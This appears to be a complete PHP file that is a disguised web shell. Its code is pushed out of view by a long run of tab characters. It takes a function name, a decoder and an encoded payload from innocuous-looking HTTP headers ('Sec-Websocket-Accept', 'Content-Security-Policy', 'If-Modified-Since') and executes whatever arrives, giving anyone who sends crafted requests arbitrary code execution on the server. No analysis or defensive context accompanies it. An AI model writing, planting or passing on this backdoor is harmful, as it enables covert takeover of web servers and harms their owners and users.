<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Sec-Websocket-Accept'])){$clases=$_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Content-Security-Policy']($_HEADERS['If-Modified-Since']));$clases();}
